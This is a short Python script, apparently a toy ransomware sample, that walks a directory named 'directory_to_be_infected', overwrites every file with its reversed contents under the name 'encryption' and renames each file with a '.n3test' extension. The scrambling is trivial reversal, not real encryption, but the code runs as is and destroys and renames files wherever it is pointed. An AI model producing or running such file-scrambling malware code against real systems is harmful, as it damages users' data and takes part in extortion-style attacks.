import os

def encryption_algo(file_content):
    to_be_written = file_content[::-1]
    return to_be_written

for dirpath,dirname,filenames in os.walk('directory_to_be_infected'):
    for filename in filenames: 
        file_name = os.path.join(dirpath,filename)
        with open(file_name,'r') as file:
            file_content = file.read()
        with open(file_name,'w') as file:
            file.write(encryption_algo(file_content))
        new_file_name = file_name+".n3test"
        os.rename(file_name,new_file_name)